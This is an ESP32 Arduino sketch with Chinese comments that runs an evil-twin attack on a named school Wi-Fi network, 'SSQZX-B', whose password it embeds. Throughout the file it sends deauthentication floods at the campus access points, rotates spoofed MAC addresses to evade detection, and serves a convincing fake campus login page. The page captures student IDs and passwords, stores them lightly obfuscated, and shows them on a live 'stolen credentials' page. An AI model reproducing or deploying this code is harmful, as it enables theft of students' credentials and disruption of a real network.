#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>
#include <WebSocketsServer.h>
#include <SPIFFS.h>
#include "esp_wifi.h"

// WiFi配置
const char* ssid = "SSQZX-B"; // 学校WiFi SSID
const char* password = "ssqzx888"; // 学校WiFi密码

// 信道
const int channel = 6;

// 校园网BSSID列表（示例，需替换为实际值）
uint8_t targetBSSIDs[][6] = {
  {0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x5E}, // 主BSSID
  {0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x5F}, // 备用BSSID1
  {0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x60}  // 备用BSSID2
};
const int numBSSIDs = 3;

// 伪装MAC地址（轮播常见厂商：TP-Link, D-Link, Netgear）
uint8_t macPrefixes[][3] = {
  {0x00, 0x14, 0x78}, // TP-Link
  {0x00, 0x24, 0xB2}, // D-Link
  {0xC4, 0x04, 0x15}  // Netgear
};
const int numMacs = 3;
int currentMac = 0;
uint8_t fakeMac[6];

// DNS服务器
DNSServer dnsServer;
const byte DNS_PORT = 53;

// Web服务器和WebSocket
WebServer server(80);
WebSocketsServer webSocket = WebSocketsServer(81);

// 存储窃取的账号密码
String stolenCredentials = "";
const char* credFile = "/credentials.txt";

// 去认证帧模板
const uint8_t deauthFrameTemplate[] = {
  0xC0, 0x00, 0x3A, 0x01, // 管理帧头部
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // 广播地址
  0x00, 0x14, 0x78, 0xDE, 0xAD, 0x01, // 伪装源MAC（动态更新）
  0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x5E, // 目标BSSID（动态更新）
  0x00, 0x00, // 序列号
  0x01, 0x00 // 去认证原因代码
};

// 伪造的校园网认证页面HTML（超逼真，模仿高校802.1X认证）
const char* fakeLoginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SSQZX-B 校园网络认证</title>
  <style>
    body { font-family: 'PingFang SC', Arial, sans-serif; background: linear-gradient(to bottom, #003087, #0055a4); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .login-container { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); width: 90%; max-width: 400px; text-align: center; }
    .logo { width: 150px; margin-bottom: 20px; }
    h2 { color: #003087; font-size: 26px; margin-bottom: 20px; }
    .input-group { margin-bottom: 20px; text-align: left; }
    label { font-size: 14px; color: #333; font-weight: bold; }
    input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
    input[type="submit"] { background: #003087; color: white; padding: 12px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
    input[type="submit"]:hover { background: #00205b; }
    .footer { font-size: 12px; color: #666; margin-top: 20px; }
    .error { color: red; font-size: 12px; margin-top: 10px; display: none; }
    @media (max-width: 600px) { .login-container { padding: 20px; } }
  </style>
  <script>
    function validateForm() {
      let user = document.getElementById('username').value;
      let pass = document.getElementById('password').value;
      if (!user || !pass) {
        document.getElementById('error').style.display = 'block';
        return false;
      }
      return true;
    }
  </script>
</head>
<body>
  <div class="login-container">
    <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==" alt="SSQZX-B Logo">
    <h2>SSQZX-B 网络认证系统</h2>
    <form action="/login" method="POST" onsubmit="return validateForm()">
      <div class="input-group">
        <label for="username">学号/用户名</label>
        <input type="text" id="username" name="username" placeholder="请输入学号或用户名" required>
      </div>
      <div class="input-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" placeholder="请输入密码" required>
      </div>
      <div id="error" class="error">请输入有效的学号和密码</div>
      <input type="submit" value="认证登录">
    </form>
    <div class="footer">SSQZX 网络中心 | 802.1X 认证 | © 2025</div>
  </div>
</body>
</html>
)rawliteral";

// 凭据展示页面HTML
const char* credentialsPage = R"rawliteral(
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>窃取的凭据</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
    .credentials-container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 90%; max-width: 600px; margin: 0 auto; }
    h2 { color: #333; text-align: center; }
    pre { background-color: #f9f9f9; padding: 10px; border-radius: 4px; white-space: pre-wrap; word-wrap: break-word; }
    @media (max-width: 600px) { .credentials-container { width: 100%; padding: 10px; } }
  </style>
  <script>
    var ws = new WebSocket('ws://' + window.location.hostname + ':81/');
    ws.onmessage = function(event) {
      document.getElementById('credentials').innerText = event.data;
    };
  </script>
</head>
<body>
  <div class="credentials-container">
    <h2>窃取的账号密码</h2>
    <pre id="credentials">%s</pre>
  </div>
</body>
</html>
)rawliteral";

// 发送去认证帧
void sendDeauthFrame(int bssidIndex) {
  uint8_t frame[sizeof(deauthFrameTemplate)];
  memcpy(frame, deauthFrameTemplate, sizeof(deauthFrameTemplate));
  memcpy(frame + 10, fakeMac, 6); // 更新源MAC
  memcpy(frame + 16, targetBSSIDs[bssidIndex], 6); // 更新目标BSSID
  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(deauthFrameTemplate), false);
  Serial.println("发送去认证帧，目标BSSID: " + String(targetBSSIDs[bssidIndex][0], HEX) + ":" + 
                 String(targetBSSIDs[bssidIndex][1], HEX) + ":" + String(targetBSSIDs[bssidIndex][2], HEX) + ":" + 
                 String(targetBSSIDs[bssidIndex][3], HEX) + ":" + String(targetBSSIDs[bssidIndex][4], HEX) + ":" + 
                 String(targetBSSIDs[bssidIndex][5], HEX));
}

// 自适应干扰：多目标高频攻击
void adaptiveInterference() {
  int burstCount = random(15, 40); // 随机15-40次
  Serial.println("自适应干扰启动，发送帧数: " + String(burstCount));
  for (int i = 0; i < burstCount; i++) {
    int bssidIndex = random(0, numBSSIDs); // 随机选择目标BSSID
    sendDeauthFrame(bssidIndex);
    delay(random(5, 20)); // 随机延迟，增加隐蔽性
  }
  Serial.println("自适应干扰结束");
}

// 保存凭据到SPIFFS（加密）
void saveCredentials(String cred) {
  File file = SPIFFS.open(credFile, FILE_APPEND);
  if (file) {
    const char key = 0x5A;
    String encrypted = "";
    for (char c : cred) {
      encrypted += (char)(c ^ key);
    }
    file.println(encrypted);
    file.close();
    Serial.println("加密凭据已保存到SPIFFS");
  } else {
    Serial.println("无法打开SPIFFS文件");
  }
}

// 读取SPIFFS中的凭据
String readCredentials() {
  File file = SPIFFS.open(credFile, FILE_READ);
  String data = "";
  const char key = 0x5A;
  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      String decrypted = "";
      for (char c : line) {
        decrypted += (char)(c ^ key);
      }
      data += decrypted + "\n";
    }
    file.close();
  }
  return data.length() > 0 ? data : "暂无窃取的凭据";
}

// 处理根路径
void handleRoot() {
  server.send(200, "text/html", fakeLoginPage);
}

// 处理登录请求
void handleLogin() {
  if (server.method() == HTTP_POST) {
    String username = server.arg("username");
    String password = server.arg("password");
    String cred = "用户名: " + username + " 密码: " + password + "\n";
    stolenCredentials += cred;
    saveCredentials(cred); // 加密保存
    Serial.println("窃取的凭据: " + cred);
    webSocket.broadcastTXT(stolenCredentials); // 实时推送
    // 伪造802.1X认证成功响应
    server.send(200, "text/html", "<h3>认证成功！正在连接网络...</h3><meta http-equiv='refresh' content='2;url=/'>");
  }
}

// 处理凭据展示页面
void handleCredentials() {
  String page = String(credentialsPage);
  page.replace("%s", stolenCredentials.length() > 0 ? stolenCredentials : "暂无窃取的凭据");
  server.send(200, "text/html", page);
}

// 处理未定义请求
void handleNotFound() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

// WebSocket事件
void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
  if (type == WStype_CONNECTED) {
    webSocket.sendTXT(num, stolenCredentials.length() > 0 ? stolenCredentials : "暂无窃取的凭据");
  }
}

// 扫描附近WiFi调整干扰强度
int scanWiFiStrength() {
  int n = WiFi.scanNetworks();
  int maxRSSI = -100;
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == ssid) {
      int rssi = WiFi.RSSI(i);
      if (rssi > maxRSSI) maxRSSI = rssi;
    }
  }
  WiFi.scanDelete();
  return maxRSSI;
}

void setup() {
  Serial.begin(115200);

  // 初始化SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS初始化失败");
    return;
  }
  stolenCredentials = readCredentials(); // 加载已有凭据

  // 设置伪造MAC地址
  memcpy(fakeMac, macPrefixes[currentMac], 3);
  fakeMac[3] = random(0x00, 0xFF);
  fakeMac[4] = random(0x00, 0xFF);
  fakeMac[5] = random(0x00, 0xFF);
  esp_wifi_set_mac(WIFI_IF_AP, fakeMac);
  Serial.println("伪造MAC地址: " + String(fakeMac[0], HEX) + ":" + String(fakeMac[1], HEX) + ":" + 
                 String(fakeMac[2], HEX) + ":" + String(fakeMac[3], HEX) + ":" + 
                 String(fakeMac[4], HEX) + ":" + String(fakeMac[5], HEX));

  // 设置ESP32为AP模式
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password, channel);
  Serial.println("伪造WiFi已启动: " + String(ssid) + " (信道 " + String(channel) + ")");
  Serial.print("AP IP地址: ");
  Serial.println(WiFi.softAPIP());

  // 设置DNS服务器
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // 设置MDNS
  if (MDNS.begin("ssqzx")) {
    Serial.println("MDNS启动: ssqzx.local");
  }

  // 设置Web服务器路由
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.on("/credentials", handleCredentials);
  server.onNotFound(handleNotFound);

  // 启动Web服务器和WebSocket
  server.begin();
  webSocket.begin();
  webSocket.onEvent(webSocketEvent);
  Serial.println("Web服务器和WebSocket已启动");

  // 初始化WiFi为原始模式
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  webSocket.loop();

  // 每10秒轮播MAC地址
  static unsigned long lastMacSwitch = 0;
  if (millis() - lastMacSwitch > 10000) {
    currentMac = (currentMac + 1) % numMacs;
    memcpy(fakeMac, macPrefixes[currentMac], 3);
    fakeMac[3] = random(0x00, 0xFF);
    fakeMac[4] = random(0x00, 0xFF);
    fakeMac[5] = random(0x00, 0xFF);
    esp_wifi_set_mac(WIFI_IF_AP, fakeMac);
    Serial.println("切换MAC: " + String(fakeMac[0], HEX) + ":" + String(fakeMac[1], HEX) + ":" + 
                   String(fakeMac[2], HEX) + ":" + String(fakeMac[3], HEX) + ":" + 
                   String(fakeMac[4], HEX) + ":" + String(fakeMac[5], HEX));
    lastMacSwitch = millis();
  }

  // 自适应干扰：根据WiFi信号强度调整
  static unsigned long lastInterference = 0;
  if (millis() - lastInterference > 12000) {
    int rssi = scanWiFiStrength();
    if (rssi > -70) { // 真实WiFi信号强，增加干扰
      adaptiveInterference();
    } else { // 信号弱，减少干扰节省资源
      sendDeauthFrame(random(0, numBSSIDs));
    }
    lastInterference = millis();
  }

  // 动态调整信号强度
  static unsigned long lastAdjust = 0;
  if (millis() - lastAdjust > 8000) {
    int txPower = random(12, 20);
    esp_wifi_set_max_tx_power(txPower);
    Serial.println("调整发射功率: " + String(txPower));
    lastAdjust = millis();
  }
}
